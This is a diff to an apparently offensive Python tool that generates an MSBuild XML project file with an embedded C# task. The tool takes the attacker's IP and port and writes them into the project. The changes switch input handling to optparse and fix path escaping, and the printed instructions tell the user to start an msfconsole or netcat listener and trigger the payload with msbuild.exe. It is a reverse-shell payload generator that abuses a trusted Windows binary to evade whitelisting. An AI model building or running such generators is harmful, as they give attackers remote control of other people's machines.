@@ -1,24 +1,18 @@
 #!/usr/bin/env python3
 
-import os
-import sys
+import optparse
 
-def main():
-    ip = input("[*] Enter your ip: ")
-    port = input("[*] Enter port [443]: ") or 443
-
-    outfile = open("mspayload_nps.xml", "w")
-
+def main(local_ip, local_port):
+    outfile = open("mspayload_nps.xml", "w+")
     outfile.write(
-        """
-<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+        """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 <Target Name="TGaywVtZz">
     <yymnTWKasHV />
 </Target>
 <UsingTask
     TaskName="yymnTWKasHV"
     TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
         <Code Type="Class" Language="cs">
             <![CDATA[
@@ -85,18 +79,25 @@ def main():
         </Code>
     </Task>
 </UsingTask>
-</Project>
-        """
-        % (ip, port))
+</Project>""" % (local_ip, local_port))
 
     outfile.close()
 
-    print("[*] File saved, %s:%s used." % (ip, port))
+    print("[+] File saved!")
     print("[*] Use msfconsole/nc to setup your listener.")
-    print("[*] Trigger the build: %windir%\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe mspayload_nps.xml")
+    print("[*] Trigger the build with: %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe mspayload_nps.xml")
     print("[*] Done!")
 
-    sys.exit(0)
+if __name__ == "__main__":
+    parser = optparse.OptionParser(usage="usage: %prog [options] arguments")
+    parser.add_option("-i", "--ip", dest="local_ip", help="IP address.")
+    parser.add_option("-p", "--port", dest="local_port", help="Port to listen on.")
+    (options, args) = parser.parse_args()
 
-if __name__ == '__main__':
-    main()
+    if not options.local_ip or not options.local_port:
+        parser.error("Missing an argument.")
+
+    local_ip = options.local_ip
+    local_port = options.local_port
+
+    main(local_ip, local_port)
